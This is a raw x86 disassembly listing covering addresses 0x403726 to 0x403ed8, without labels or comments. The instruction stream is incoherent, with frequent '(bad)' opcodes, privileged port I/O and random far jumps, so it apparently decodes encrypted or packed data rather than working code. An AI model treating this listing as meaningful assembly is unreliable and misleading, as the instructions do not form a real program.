  403726:	dec    esi
  403727:	xchg   edx,eax
  403728:	push   ebx
  403729:	sahf   
  40372a:	sahf   
  40372b:	sub    ah,BYTE PTR [ecx+0x1b]
  40372e:	ror    DWORD PTR [esp+edi*1],0x79
  403732:	inc    edi
  403733:	sbb    esi,esp
  403735:	jne    0x4037a0
  403737:	jl     0x40373e
  403739:	bound  ebp,QWORD PTR [edi-0x77efe7ea]
  40373f:	cmp    eax,0x903812ec
  403744:	mov    ecx,0xecbcdb84
  403749:	aad    0x1b
  40374b:	sbb    DWORD PTR [ebx],eax
  40374d:	loope  0x403762
  40374f:	or     edi,DWORD PTR [eax]
  403751:	mov    BYTE PTR [edi-0x30],ch
  403754:	fsub   st(3),st
  403756:	popf   
  403757:	xchg   edi,eax
  403758:	xchg   edi,eax
  403759:	xchg   ebx,edi
  40375b:	inc    esi
  40375c:	xchg   edx,eax
  40375d:	and    al,0xd3
  40375f:	lds    eax,FWORD PTR [ecx-0x7b]
  403762:	xor    ch,ah
  403764:	ss repnz xor ax,0xddae
  40376a:	jle    0x403777
  40376c:	xchg   esi,eax
  40376d:	push   cs
  40376e:	sar    BYTE PTR [ebx+0x7f37d6bb],0xa9
  403775:	xchg   ecx,eax
  403776:	sbb    eax,0x50c4aca6
  40377b:	rcl    esi,1
  40377d:	std    
  40377e:	mov    ah,BYTE PTR ds:0x42b672f3
  403784:	fwait
  403785:	jg     0x403742
  403787:	sbb    al,bl
  403789:	mov    edx,0xa5a1b553
  40378e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40378f:	das    
  403790:	dec    eax
  403791:	fisttp WORD PTR [edi-0x54]
  403794:	test   eax,0x4e84fa6b
  403799:	mov    ss,eax
  40379b:	or     dh,BYTE PTR [eax+edi*4-0x7e]
  40379f:	cmp    al,0x5b
  4037a1:	retf   0xf183
  4037a4:	mov    cl,0xcf
  4037a6:	pushf  
  4037a7:	pop    es
  4037a8:	mov    ah,0x88
  4037aa:	add    al,0x44
  4037ac:	mov    cs,WORD PTR [ebx+ebp*4+0x6c6bbf4a]
  4037b3:	ss fsub st,st(1)
  4037b6:	nop
  4037b7:	xor    ecx,esp
  4037b9:	mov    bh,0x69
  4037bb:	stos   DWORD PTR es:[edi],eax
  4037bc:	pop    esp
  4037bd:	sbb    esp,DWORD PTR [eax+eiz*4]
  4037c0:	scas   al,BYTE PTR es:[edi]
  4037c1:	xor    esi,esp
  4037c3:	xchg   esp,eax
  4037c4:	sub    BYTE PTR [ebp+0x36],ch
  4037c7:	cmp    esp,esi
  4037c9:	push   edx
  4037ca:	dec    ebx
  4037cb:	push   ss
  4037cc:	mov    ah,0x6c
  4037ce:	dec    edi
  4037cf:	xor    BYTE PTR [ebx],dl
  4037d1:	xchg   esp,eax
  4037d2:	imul   esp,DWORD PTR [ecx+0x4ebd7d80],0xffffffb5
  4037d9:	mov    eax,0x3a3c0a79
  4037de:	adc    eax,0xcc01e9ea
  4037e3:	scas   eax,DWORD PTR es:[edi]
  4037e4:	lea    ebx,[ebx-0x5e4871ec]
  4037ea:	jl     0x4037ca
  4037ec:	sub    esp,DWORD PTR [ebx]
  4037ee:	jecxz  0x403849
  4037f0:	xchg   ah,al
  4037f2:	icebp  
  4037f3:	cwde   
  4037f4:	xor    DWORD PTR [ebp+0x4750b795],edi
  4037fa:	push   0x21
  4037fc:	je     0x403868
  4037fe:	outs   dx,DWORD PTR ds:[esi]
  4037ff:	in     eax,0x8c
  403801:	ins    BYTE PTR es:[edi],dx
  403802:	adc    edi,eax
  403804:	adc    al,0x20
  403806:	xchg   BYTE PTR [ecx+0x1e150637],dh
  40380c:	cwde   
  40380d:	(bad)
  403810:	pop    ss
  403811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403812:	mov    cl,0xeb
  403814:	sbb    DWORD PTR [ebp+0x15],0x6d5ad732
  40381b:	(bad)  
  40381c:	call   0x3a146c78
  403821:	ret    0x197b
  403824:	push   edi
  403825:	inc    edi
  403826:	xchg   ebp,eax
  403827:	push   ss
  403828:	mov    bl,0x63
  40382a:	gs jl  0x4037f1
  40382d:	pop    esi
  40382e:	cmp    bl,dh
  403830:	outs   dx,BYTE PTR ds:[esi]
  403831:	in     al,dx
  403832:	or     eax,0x4740f606
  403837:	inc    edx
  403838:	or     eax,0xd5ad92a8
  40383d:	(bad)  
  40383e:	or     dh,BYTE PTR [edi+ebp*4]
  403841:	mov    BYTE PTR [edx],al
  403843:	add    edx,esp
  403845:	sub    BYTE PTR [edx+0x77cedc3a],0xd1
  40384c:	das    
  40384d:	fcomp  QWORD PTR ds:0x900bbf74
  403853:	fst    QWORD PTR [edi+0x12ab13fe]
  403859:	rol    bl,0xa9
  40385c:	mov    al,0x3e
  40385e:	or     ecx,esp
  403860:	xchg   esp,eax
  403861:	inc    edx
  403862:	adc    ch,BYTE PTR [edi-0x321cfd9]
  403868:	loop   0x4037f7
  40386a:	fsubr  DWORD PTR [ebx-0x49]
  40386d:	(bad)  
  40386e:	ffree  st(6)
  403870:	xor    BYTE PTR [edx+eax*8+0x2c2ed134],bl
  403877:	dec    esp
  403878:	call   0x6c76248c
  40387d:	dec    edi
  40387e:	adc    eax,0x569574f
  403883:	jne    0x40385f
  403885:	cmp    edx,DWORD PTR [ecx]
  403887:	mov    eax,ds:0xe8191f78
  40388c:	ins    DWORD PTR es:[edi],dx
  40388d:	pop    edx
  40388f:	add    BYTE PTR [ebp-0x125f359b],cl
  403895:	add    dh,BYTE PTR [ebx+0x1]
  403898:	cmp    BYTE PTR [eax],al
  40389a:	(bad)  
  40389b:	xchg   esp,eax
  40389c:	sbb    eax,0xa228851f
  4038a1:	push   cs
  4038a2:	cmp    al,BYTE PTR [ebx]
  4038a4:	icebp  
  4038a5:	outs   dx,BYTE PTR ds:[esi]
  4038a6:	inc    eax
  4038a7:	out    0x99,al
  4038a9:	xor    eax,0xb50e8a06
  4038ae:	in     al,dx
  4038af:	jge    0x403894
  4038b1:	or     dl,bh
  4038b3:	cmp    al,0x45
  4038b5:	pop    ds
  4038b6:	dec    esp
  4038b7:	retf   0xf780
  4038ba:	div    BYTE PTR [eax+0x7b]
  4038bd:	cmp    al,0x34
  4038bf:	push   ebx
  4038c0:	loope  0x40390c
  4038c2:	jge    0x403921
  4038c4:	ss cdq 
  4038c6:	cmp    esp,DWORD PTR [eax]
  4038c8:	xchg   ebx,eax
  4038c9:	and    al,0xeb
  4038cb:	je     0x4038ce
  4038cd:	daa    
  4038ce:	fwait
  4038cf:	outs   dx,DWORD PTR ds:[esi]
  4038d0:	add    eax,DWORD PTR [ebx+ebp*8]
  4038d3:	or     al,0xb3
  4038d5:	adc    bl,cl
  4038d7:	loopne 0x40394b
  4038d9:	test   BYTE PTR [ecx-0x56],bl
  4038dc:	aas    
  4038dd:	sbb    BYTE PTR [ecx],0x3b
  4038e0:	mov    al,ds:0xb16b6c83
  4038e5:	shr    edx,0xff
  4038e8:	fcmovu st,st(5)
  4038ea:	mov    DWORD PTR [ebp+0x1b],esi
  4038ed:	and    BYTE PTR [edi-0x3492672c],0x9b
  4038f4:	or     DWORD PTR [ecx+0x69],eax
  4038f7:	scas   eax,DWORD PTR es:[edi]
  4038f8:	mov    esp,0x828f220d
  4038fd:	nop
  4038fe:	sar    BYTE PTR [eax-0x1b92bd91],0x89
  403905:	xor    al,dh
  403907:	pop    ds
  403908:	xor    BYTE PTR [edx-0x5a],0xb5
  40390c:	popf   
  40390d:	xchg   edx,eax
  40390e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40390f:	fisubr WORD PTR [edx+0x25337f13]
  403915:	popf   
  403916:	je     0x403936
  403918:	loopne 0x403903
  40391a:	pop    esp
  40391b:	add    eax,0x43648e1f
  403920:	sbb    edx,DWORD PTR [eax+0x3c]
  403923:	je     0x403940
  403925:	(bad)  
  403926:	clc    
  403927:	fld1   
  403929:	aad    0x70
  40392b:	lods   eax,DWORD PTR ds:[esi]
  40392c:	mov    bh,0x95
  40392e:	push   edi
  40392f:	(bad)  
  403930:	sub    ecx,DWORD PTR [ebx+esi*2+0x5bec0b70]
  403937:	mov    edi,0x331fdf86
  40393c:	pop    eax
  40393d:	pop    ecx
  40393e:	test   edx,edx
  403940:	scas   al,BYTE PTR es:[edi]
  403941:	lods   al,BYTE PTR ds:[esi]
  403942:	dec    edx
  403943:	mov    ecx,0x695366c1
  403948:	aas    
  403949:	sbb    eax,0xc5a03f22
  40394e:	jmp    edi
  403950:	xor    DWORD PTR [esi+0x3],ebx
  403953:	mov    esi,0x67bcff29
  403958:	pop    eax
  403959:	mov    bl,0x99
  40395b:	and    ax,0x4205
  40395f:	out    0x89,al
  403961:	outs   dx,DWORD PTR ds:[esi]
  403962:	clc    
  403963:	mov    ch,bh
  403965:	push   esi
  403966:	pop    eax
  403967:	cld    
  403968:	dec    esi
  403969:	fcomp  DWORD PTR [ecx-0x4d]
  40396c:	mov    ecx,0x292b582e
  403971:	adc    DWORD PTR [ebx+ebp*1],ebx
  403974:	loop   0x40395a
  403976:	adc    ecx,DWORD PTR ds:0xd3d26ebe
  40397c:	sub    ebx,DWORD PTR [ebp-0x4d]
  40397f:	(bad)  
  403980:	mov    ebp,0x9809b566
  403985:	sbb    bh,BYTE PTR [esi]
  403987:	dec    BYTE PTR [ebp+ebx*1+0x181a6ea3]
  40398e:	push   ebx
  40398f:	add    BYTE PTR [ecx-0x323f5ff1],bl
  403995:	or     edx,DWORD PTR [esi+ebx*1]
  403998:	stc    
  403999:	and    esp,ebp
  40399b:	(bad)  
  40399c:	mov    ebp,0x49a4f9fa
  4039a1:	ja     0x40398c
  4039a3:	push   ss
  4039a4:	cdq    
  4039a5:	add    al,0x81
  4039a7:	lds    ebp,FWORD PTR [ebx+edi*8]
  4039aa:	mov    WORD PTR [ecx+0x34],ss
  4039ad:	retf   0xb21b
  4039b0:	ss xor al,0xe7
  4039b3:	mov    eax,ds:0x93297699
  4039b8:	xor    eax,0x8c3318fc
  4039bd:	adc    ch,ch
  4039bf:	into   
  4039c0:	repz fidiv DWORD PTR [ecx+0xaa42164]
  4039c7:	sbb    eax,0x7ddf0b99
  4039cc:	pop    es
  4039cd:	mov    dl,0xc2
  4039cf:	jg     0x403a17
  4039d1:	mov    DWORD PTR [ebp-0x7e55f0c],edx
  4039d7:	cwde   
  4039d8:	pop    ds
  4039d9:	push   esp
  4039da:	add    DWORD PTR [edx+0xf],0x965bd480
  4039e1:	adc    eax,0x8be65ab0
  4039e6:	sub    eax,0xc8ea14e
  4039eb:	and    eax,0x3dd0e3e4
  4039f0:	stc    
  4039f1:	das    
  4039f2:	fistp  DWORD PTR [edx]
  4039f4:	xchg   ecx,eax
  4039f5:	pop    eax
  4039f6:	mov    eax,ds:0x5e7977b5
  4039fb:	icebp  
  4039fc:	aaa    
  4039fd:	add    eax,DWORD PTR [eax]
  4039ff:	xchg   BYTE PTR [edx],bh
  403a01:	push   eax
  403a02:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  403a04:	pop    ss
  403a05:	adc    al,0x88
  403a07:	mov    dl,0x88
  403a09:	xchg   ebx,eax
  403a0a:	jmp    0x3a05f81d
  403a0f:	iret   
  403a10:	(bad)  
  403a11:	fs and eax,0xf77c974d
  403a17:	cs sbb ecx,ecx
  403a1a:	test   edx,0xc8a1d72f
  403a20:	pop    edi
  403a21:	cmp    DWORD PTR [ecx+0x2a],esi
  403a24:	ja     0x403a15
  403a26:	sti    
  403a27:	pop    eax
  403a28:	sub    esi,0x8a77b643
  403a2e:	retf   
  403a2f:	lods   eax,DWORD PTR ds:[esi]
  403a30:	xchg   esp,eax
  403a31:	add    al,0x12
  403a33:	mov    cs,WORD PTR [eax-0x36]
  403a36:	pop    edi
  403a37:	das    
  403a38:	data16 icebp 
  403a3a:	out    0x43,eax
  403a3c:	sbb    eax,0xadc96846
  403a41:	int    0xf3
  403a43:	mov    eax,ds:0x826c5da4
  403a48:	repz adc dl,ch
  403a4b:	add    bl,BYTE PTR [edi+ebp*4]
  403a4e:	dec    edx
  403a4f:	pop    eax
  403a50:	jmp    0xd0378544
  403a55:	int3   
  403a56:	iret   
  403a57:	pop    edx
  403a58:	sbb    eax,0xddee0834
  403a5d:	mov    ecx,0xb9f317f6
  403a62:	ficom  WORD PTR [edi-0x24]
  403a65:	jp     0x403a62
  403a67:	mov    bh,0x4d
  403a69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a6a:	mov    DWORD PTR [edi-0x58baa2d],ebp
  403a70:	jmp    0x4039f2
  403a72:	repz sti 
  403a74:	xchg   edx,eax
  403a75:	mov    dl,0xd7
  403a77:	jmp    0xc04f:0xfba846d0
  403a7e:	ins    DWORD PTR es:[edi],dx
  403a7f:	push   0x491bbe5e
  403a84:	nop
  403a85:	cmp    BYTE PTR [eax],0x27
  403a88:	bound  ebp,QWORD PTR ds:0x5262f891
  403a8e:	mov    ebp,0x98d59ad0
  403a93:	xchg   ecx,eax
  403a94:	jp     0x403a4c
  403a96:	sub    al,0x95
  403a98:	or     DWORD PTR [edx-0x5ee224ae],0x6
  403a9f:	cmp    BYTE PTR [ecx],dl
  403aa1:	fisttp DWORD PTR [edx+0x77]
  403aa4:	xlat   BYTE PTR ds:[ebx]
  403aa5:	cs sub esi,0x99d6c7d
  403aac:	in     eax,dx
  403aad:	(bad)  [ecx+edx*1]
  403ab0:	jbe    0x403aba
  403ab2:	xchg   edi,eax
  403ab3:	(bad)  
  403ab4:	mov    edx,0xd0ab8e72
  403ab9:	into   
  403aba:	sbb    al,0xc9
  403abc:	cmp    BYTE PTR [ebp+0x6050c9af],dl
  403ac2:	and    ebp,ecx
  403ac4:	mov    WORD PTR ds:0x5cf728ba,cs
  403aca:	jbe    0x403aab
  403acc:	xlat   BYTE PTR ds:[ebx]
  403acd:	jnp    0x403a61
  403acf:	or     dh,ah
  403ad1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ad2:	(bad)  
  403ad3:	xchg   ebp,eax
  403ad4:	adc    eax,0xa9bd557d
  403ad9:	lods   eax,DWORD PTR ds:[esi]
  403ada:	mov    ds:0x15b6c59,eax
  403adf:	arpl   ax,si
  403ae1:	bound  edi,QWORD PTR [esi]
  403ae3:	or     ebp,DWORD PTR [esp+ebp*4]
  403ae6:	push   eax
  403ae7:	nop
  403ae8:	out    0xb5,al
  403aea:	adc    eax,0x8c1e4bc7
  403aef:	xor    DWORD PTR [edi-0x41f62b18],esi
  403af5:	sub    DWORD PTR [edi+0x40],ebp
  403af8:	ret    
  403af9:	jns    0x403af4
  403afb:	sub    eax,0xe18b1d63
  403b00:	or     BYTE PTR [ebp+0xb2adb83],ch
  403b06:	add    bh,al
  403b08:	(bad)  
  403b09:	mov    dl,0x12
  403b0b:	jmp    0x7045:0x7a48158f
  403b12:	adc    al,BYTE PTR [esi-0x35]
  403b15:	frstor [ecx]
  403b17:	fcomip st,st(6)
  403b19:	dec    ebp
  403b1a:	scas   al,BYTE PTR es:[edi]
  403b1b:	aad    0x0
  403b1d:	loopne 0x403b39
  403b1f:	dec    esp
  403b20:	dec    esp
  403b21:	jo     0x403b85
  403b23:	jmp    0x6282:0x5959ac7d
  403b2a:	mov    esp,0x5a5dfc3d
  403b2f:	mov    DWORD PTR [edx],esi
  403b31:	inc    ebp
  403b32:	push   cs
  403b33:	lahf   
  403b34:	repnz sub cl,BYTE PTR [esi+0x42e92161]
  403b3b:	sbb    al,0x98
  403b3d:	cmp    ecx,esp
  403b3f:	nop
  403b40:	or     bl,bh
  403b42:	pop    ss
  403b43:	dec    ebx
  403b44:	mov    eax,0xd352274d
  403b49:	icebp  
  403b4a:	stos   BYTE PTR es:[edi],al
  403b4b:	aaa    
  403b4c:	dec    edx
  403b4d:	data16 sahf 
  403b4f:	es mov ah,0x60
  403b52:	aas    
  403b53:	adc    BYTE PTR [ebp+0x44],al
  403b56:	leave  
  403b57:	pop    edx
  403b58:	push   ds
  403b59:	dec    edx
  403b5a:	nop
  403b5b:	jnp    0x403b9b
  403b5d:	push   esi
  403b5e:	xor    ebx,esp
  403b60:	lods   eax,DWORD PTR ds:[esi]
  403b61:	xchg   ebp,eax
  403b62:	arpl   WORD PTR [esi],di
  403b64:	sbb    bl,BYTE PTR [edi-0x7a]
  403b67:	or     bl,BYTE PTR [ebx-0x60287244]
  403b6d:	mov    ds:0xcff49f95,al
  403b72:	int3   
  403b73:	sar    BYTE PTR [edx+0x517d8485],0x5b
  403b7a:	fild   WORD PTR [ebp-0x5f]
  403b7d:	pop    ss
  403b7e:	mov    eax,0xd4eb25bd
  403b83:	mov    al,BYTE PTR [esi+0x26]
  403b86:	popf   
  403b87:	push   edx
  403b88:	xchg   cl,cl
  403b8a:	es xchg dl,dl
  403b8d:	cmp    DWORD PTR [ecx+eiz*4-0xfdf7da8],edx
  403b94:	pop    ebp
  403b95:	pop    es
  403b96:	fwait
  403b97:	mov    eax,0xdf0de8cc
  403b9c:	and    al,0x32
  403b9e:	mov    al,ds:0x8961711f
  403ba3:	scas   al,BYTE PTR es:[edi]
  403ba4:	pop    ds
  403ba5:	sti    
  403ba6:	jnp    0x403bb6
  403ba8:	pop    edx
  403ba9:	adc    esi,ebp
  403bab:	retf   0x5dc5
  403bae:	xor    cl,dl
  403bb0:	nop
  403bb1:	jbe    0x403bdb
  403bb3:	fidiv  WORD PTR [eax+0x6e]
  403bb6:	adc    al,0xd2
  403bb8:	pop    esi
  403bb9:	lods   al,BYTE PTR ds:[esi]
  403bba:	push   es
  403bbb:	stos   BYTE PTR es:[edi],al
  403bbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bbd:	mov    ebx,edi
  403bbf:	shr    BYTE PTR [ebx+0x58e0b937],cl
  403bc5:	push   eax
  403bc6:	aam    0x7b
  403bc8:	mov    WORD PTR [ebx+0x30],cs
  403bcb:	stos   BYTE PTR es:[edi],al
  403bcc:	add    BYTE PTR [esi+0x3],dl
  403bcf:	and    DWORD PTR [eax+ebx*1],esi
  403bd2:	push   ecx
  403bd3:	mov    bl,0xfa
  403bd5:	test   eax,0x231f9352
  403bda:	pushf  
  403bdb:	enter  0x9fb2,0x3d
  403bdf:	jp     0x403c0f
  403be1:	(bad)  
  403be2:	sahf   
  403be3:	cdq    
  403be4:	test   BYTE PTR [eax-0x1],al
  403be7:	lds    edi,FWORD PTR [esp+esi*1-0x249bbba1]
  403bee:	cld    
  403bef:	scas   eax,DWORD PTR es:[edi]
  403bf0:	dec    edx
  403bf1:	stc    
  403bf2:	jg     0x403bd1
  403bf4:	jmp    0xaf521c8
  403bf9:	aas    
  403bfa:	bound  ebx,QWORD PTR [ebx]
  403bfc:	push   cs
  403bfd:	xchg   ah,al
  403bff:	ja     0x403c74
  403c01:	ror    DWORD PTR [edi+0x79cbeddc],cl
  403c07:	dec    esi
  403c08:	xor    al,0xb9
  403c0a:	addr16 (bad) 
  403c0c:	sub    dl,bh
  403c0e:	pushf  
  403c0f:	dec    BYTE PTR [edi-0x3103c2ec]
  403c15:	cmc    
  403c16:	lea    edx,[esi+edx*2]
  403c19:	pop    ecx
  403c1a:	out    dx,al
  403c1b:	xor    al,0xfb
  403c1d:	xor    DWORD PTR [eax+ebx*8+0x44],esi
  403c21:	jno    0x403c5a
  403c23:	xor    DWORD PTR [edi],esi
  403c25:	jmp    DWORD PTR [eax+0x24b281e]
  403c2b:	xchg   edx,eax
  403c2d:	pop    ebx
  403c2e:	outs   dx,BYTE PTR ds:[esi]
  403c2f:	jl     0x403c7e
  403c31:	jns    0x403c3d
  403c33:	(bad)  
  403c34:	or     cl,ah
  403c36:	jle    0x403bf5
  403c38:	stos   DWORD PTR es:[edi],eax
  403c39:	std    
  403c3a:	ret    0xfab0
  403c3d:	gs dec edi
  403c3f:	jne    0x403c7f
  403c41:	cmp    eax,0x79543dbc
  403c46:	inc    edx
  403c47:	test   al,0x12
  403c49:	xchg   ebx,eax
  403c4a:	loope  0x403cbd
  403c4c:	fst    QWORD PTR [eax-0x6a5b3d4e]
  403c52:	das    
  403c53:	push   ss
  403c54:	jo     0x403c4d
  403c56:	sub    al,0xae
  403c58:	sbb    esi,edx
  403c5a:	pop    ebp
  403c5b:	scas   al,BYTE PTR es:[edi]
  403c5c:	push   es
  403c5d:	and    al,0xe3
  403c5f:	iret   
  403c60:	add    DWORD PTR [edx-0xa845bde],edi
  403c66:	push   edx
  403c67:	and    eax,0xe629c443
  403c6c:	enter  0x8c13,0x7
  403c70:	push   ecx
  403c71:	es dec edx
  403c73:	fidiv  WORD PTR [ebx-0x43]
  403c76:	cmp    cl,BYTE PTR [eax]
  403c78:	pop    esp
  403c79:	mov    bh,0xba
  403c7b:	pop    edi
  403c7c:	data16 test BYTE PTR [edx-0x6354eb1],0xc1
  403c84:	mov    bh,0x41
  403c87:	ret    
  403c88:	mov    ebp,0xfead7423
  403c8d:	and    BYTE PTR [edx-0x33],bl
  403c90:	xlat   BYTE PTR ds:[ebx]
  403c91:	iret   
  403c92:	mov    edx,0xe7ea3981
  403c97:	cli    
  403c98:	jno    0x403c8b
  403c9a:	cmp    ebx,DWORD PTR [ecx]
  403c9c:	add    ebp,esp
  403c9e:	into   
  403c9f:	or     edi,DWORD PTR ds:0xc2b45cd8
  403ca5:	cli    
  403ca6:	add    al,0xe1
  403ca8:	push   esp
  403ca9:	sub    al,0x27
  403cab:	(bad)  
  403cac:	dec    edi
  403cad:	sub    DWORD PTR [ebx-0x204f7a3d],edx
  403cb3:	ins    BYTE PTR es:[edi],dx
  403cb4:	(bad)  
  403cb6:	xchg   esi,eax
  403cb7:	imul   eax,DWORD PTR [edi+ecx*2+0x7a71fadc],0x2d
  403cbf:	mov    ds:0x83f5a90e,eax
  403cc4:	sbb    BYTE PTR [bp+di+0x67],bl
  403cc8:	mov    ch,0xb1
  403cca:	hlt    
  403ccb:	mov    edi,0x2ebcfd62
  403cd0:	fadd   DWORD PTR [edi+0x67018984]
  403cd6:	in     eax,dx
  403cd7:	cmp    al,0x87
  403cd9:	mov    BYTE PTR [ecx],al
  403cdb:	jle    0x403c93
  403cdd:	sahf   
  403cde:	or     ecx,DWORD PTR [edx-0x57154e7f]
  403ce4:	or     BYTE PTR [ebp-0xe545115],cl
  403cea:	adc    ch,BYTE PTR [edx-0x4920707f]
  403cf0:	sub    al,0xd9
  403cf2:	dec    ebp
  403cf3:	lahf   
  403cf4:	dec    ebp
  403cf5:	imul   edi,DWORD PTR [ebp-0x55],0xe3edd942
  403cfc:	in     al,dx
  403cfd:	(bad)  
  403cfe:	bound  ebp,QWORD PTR [esi+eiz*1-0x6f]
  403d02:	sahf   
  403d03:	loopne 0x403d32
  403d05:	stos   DWORD PTR es:[edi],eax
  403d06:	pop    DWORD PTR [esi-0x4f5add51]
  403d0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d0d:	fsubr  DWORD PTR [ecx]
  403d0f:	add    al,0x22
  403d11:	mov    BYTE PTR [ecx-0x3e],bl
  403d14:	xchg   esp,eax
  403d15:	hlt    
  403d16:	test   eax,0x7fd7f9e0
  403d1b:	clc    
  403d1c:	call   0x7e004cc4
  403d21:	push   0xffffffdd
  403d23:	int3   
  403d24:	mov    ch,0xce
  403d26:	push   esp
  403d27:	jne    0x403d43
  403d29:	xor    DWORD PTR [esi],ebp
  403d2b:	rcr    BYTE PTR [ecx],1
  403d2d:	inc    esi
  403d2e:	inc    edi
  403d2f:	loopne 0x403d99
  403d31:	cmp    esi,esi
  403d33:	or     al,0x86
  403d35:	sub    al,0xda
  403d37:	aam    0xd2
  403d39:	popf   
  403d3a:	out    0x91,eax
  403d3c:	inc    ecx
  403d3d:	bound  ecx,QWORD PTR [ebp-0x57e3189]
  403d43:	xchg   edx,eax
  403d44:	mov    dh,0xc7
  403d46:	dec    ecx
  403d47:	clc    
  403d48:	add    ebp,DWORD PTR [ecx-0xe]
  403d4b:	mov    ah,0x18
  403d4d:	push   cs
  403d4e:	test   al,0xd0
  403d50:	js     0x403cf9
  403d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d53:	bound  ecx,QWORD PTR [edi-0x7b]
  403d56:	push   cx
  403d58:	push   ebx
  403d59:	jbe    0x403dba
  403d5b:	dec    di
  403d5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d5e:	(bad)  
  403d5f:	sub    eax,0x4294727d
  403d64:	mov    cl,0x9e
  403d66:	ret    0xb56b
  403d69:	or     al,0x40
  403d6b:	dec    edx
  403d6c:	inc    ebp
  403d6d:	add    ebp,DWORD PTR [edx]
  403d6f:	xlat   BYTE PTR ds:[ebx]
  403d70:	lahf   
  403d71:	mov    esi,?
  403d73:	call   0x64062579
  403d78:	(bad)  
  403d79:	retf   0x5536
  403d7c:	(bad)  
  403d7d:	push   cs
  403d7e:	inc    esp
  403d7f:	fsub   QWORD PTR [ecx]
  403d81:	dec    eax
  403d82:	mov    ch,0x4d
  403d84:	ins    DWORD PTR es:[edi],dx
  403d85:	and    DWORD PTR [ecx-0x6b],esp
  403d88:	or     BYTE PTR [eax+0x6bb64759],ah
  403d8e:	and    DWORD PTR [edi+0x471ea969],esp
  403d94:	andnps xmm0,xmm0
  403d97:	loope  0x403dd6
  403d99:	push   ebx
  403d9a:	pop    ss
  403d9b:	add    dl,0x47
  403d9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d9f:	std    
  403da0:	or     al,0xec
  403da2:	mov    BYTE PTR [edi-0x5348267c],ch
  403da8:	sub    DWORD PTR [edx-0x3],eax
  403dab:	imul   esp,DWORD PTR [edi+0x2d6311c5],0x5912299c
  403db5:	ja     0x403d9f
  403db7:	les    ecx,FWORD PTR [edi]
  403db9:	mov    ah,0x68
  403dbb:	fisttp QWORD PTR [eax+0x3b]
  403dbe:	out    dx,eax
  403dbf:	lock jmp 0xa485:0x6f8f9a5a
  403dc7:	fild   QWORD PTR [eax-0x490bbc20]
  403dcd:	dec    ebp
  403dce:	fisttp DWORD PTR [ecx+0x6a]
  403dd1:	ds pop edi
  403dd3:	or     DWORD PTR [ebx],esp
  403dd5:	test   DWORD PTR [esi-0x7c],0xbf84df1c
  403ddc:	inc    edx
  403ddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403dde:	mov    esp,0x79757fc1
  403de3:	mov    cl,0xd5
  403de5:	outs   dx,DWORD PTR ds:[esi]
  403de6:	jecxz  0x403d6a
  403de8:	add    ebx,edx
  403dea:	sti    
  403deb:	fcomp  st(4)
  403ded:	icebp  
  403dee:	pop    esi
  403def:	push   ecx
  403df0:	(bad)  
  403df1:	add    ah,BYTE PTR [ebx-0x61]
  403df4:	add    dl,BYTE PTR [edx-0x32bfc843]
  403dfa:	mov    WORD PTR [edi-0x37c907ba],gs
  403e00:	push   cs
  403e01:	xor    BYTE PTR [edx-0x2ac44fb0],dh
  403e07:	or     eax,0x8c6f3fd1
  403e0c:	pop    ds
  403e0d:	nop
  403e0e:	mov    ebx,0x935133a7
  403e13:	test   al,0x45
  403e15:	dec    edx
  403e16:	sub    eax,0xa5786a3d
  403e1b:	sub    DWORD PTR [esi-0x6f],edx
  403e1e:	and    DWORD PTR [ebx+0x3c896d3c],0x35
  403e25:	xchg   edx,eax
  403e26:	jecxz  0x403e92
  403e28:	and    ah,BYTE PTR [ebp+0x12fa0740]
  403e2e:	adc    ecx,eax
  403e30:	add    BYTE PTR [edx],al
  403e32:	inc    eax
  403e33:	pop    ss
  403e34:	dec    esi
  403e35:	sbb    BYTE PTR [edi],bh
  403e37:	loop   0x403e5a
  403e39:	mov    ds:0x620219da,eax
  403e3e:	mov    bl,cl
  403e40:	sub    eax,0x5334f796
  403e45:	jge    0x403e28
  403e47:	jg     0x403dfc
  403e49:	mov    edx,ebx
  403e4b:	in     al,0xf2
  403e4d:	mov    edx,0x636a9a1f
  403e52:	imul   ebp,DWORD PTR [edi],0xb3a96a61
  403e58:	cld    
  403e59:	test   eax,0x60c82b99
  403e5e:	cmp    BYTE PTR [ecx],0x22
  403e61:	lds    edi,FWORD PTR [ecx+0x69e09da]
  403e67:	push   0x41
  403e69:	add    BYTE PTR [eax],0x57
  403e6c:	cdq    
  403e6d:	sub    edx,DWORD PTR [eax-0x25]
  403e70:	sub    eax,DWORD PTR [eax+0x4976df6d]
  403e76:	sbb    BYTE PTR [edx+0x2c],dl
  403e79:	xor    ebx,ebx
  403e7b:	neg    DWORD PTR [eax+0x7cc2177c]
  403e81:	fmul   DWORD PTR ds:0xa392f93e
  403e87:	test   al,0x43
  403e89:	ror    DWORD PTR [ebx+0x4f6a6a70],1
  403e8f:	call   0x3d6b:0x12eef210
  403e96:	inc    eax
  403e97:	sub    BYTE PTR [ecx+0x7b9bad01],cl
  403e9d:	xor    ah,cl
  403e9f:	imul   edx,DWORD PTR [esi-0x3c0bb10c],0xaf672208
  403ea9:	int3   
  403eaa:	in     al,dx
  403eab:	inc    edi
  403eac:	mov    ebp,0x15d26e3a
  403eb1:	std    
  403eb2:	xchg   ecx,eax
  403eb3:	sbb    dh,ah
  403eb5:	pop    ecx
  403eb6:	jmp    FWORD PTR [esi]
  403eb8:	push   edi
  403eb9:	push   cs
  403eba:	scas   al,BYTE PTR es:[edi]
  403ebb:	(bad)  
  403ebc:	aas    
  403ebd:	jb     0x403ec6
  403ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ec0:	adc    DWORD PTR [edi],esi
  403ec2:	xor    DWORD PTR [eax-0x4f889610],ebp
  403ec8:	pop    ebx
  403eca:	and    DWORD PTR [eax-0x4ffdd97c],ecx
  403ed0:	mov    ch,0x2e
  403ed2:	cs push 0x82beec83
  403ed8:	loop   0x403f2c
